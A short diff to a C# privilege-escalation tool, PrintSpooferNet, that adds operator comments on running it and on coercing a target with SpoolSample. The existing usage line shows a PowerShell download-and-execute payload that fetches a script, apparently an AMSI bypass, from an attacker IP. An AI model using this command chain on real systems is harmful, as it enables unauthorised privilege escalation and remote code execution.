@@ -1,3 +1,4 @@
+//This code is meant to be thrown as a user that has not performed an interactive logon
 using System;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -109,6 +110,7 @@ namespace PrintSpooferNet
             {
                 Console.WriteLine("[! ]Usage: PrintSpooferNet.exe pipename payload");
                 Console.WriteLine("[!] Example: \\\\.\\pipe\\test\\pipe\\spoolss \"powershell IEX(New-Object System.Net.WebClient).downloadString('http://192.168.45.5/amsi.txt')\"");
+                //Then with SpoolSample: C:\spoolsample.exe <target> <pipe_name>, example: C:\spoolsample.exe web01 web01/pipe/test
                 return;
             }
 
